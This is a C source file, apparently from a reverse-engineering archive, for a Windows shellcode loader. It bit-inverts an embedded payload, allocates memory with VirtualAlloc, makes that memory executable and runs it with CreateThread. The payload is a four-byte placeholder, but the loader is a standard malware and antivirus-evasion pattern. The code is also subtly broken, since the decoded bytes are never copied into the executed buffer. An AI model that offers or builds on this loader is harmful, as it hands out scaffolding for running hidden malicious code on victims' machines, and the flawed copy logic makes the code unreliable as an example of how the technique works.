/*
    Shellcode Loader
    Archive of Reversing.ID

    Reordering the shellcode with custom algorithm.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    bit inverse
*/

#include <windows.h>
#include <stdint.h>
#include <stdlib.h>

void substitute (uint8_t * dst, uint8_t * src, size_t size)
{
    for (size_t idx=0; idx<size; idx++) {
        dst[idx] = ~src[idx];
    }
}


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x6f, 0x6f, 0x33, 0x3c };
    uint32_t    payload_len = 4;
    uint32_t    idx;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    substitute((uint8_t*)payload, (uint8_t*)payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}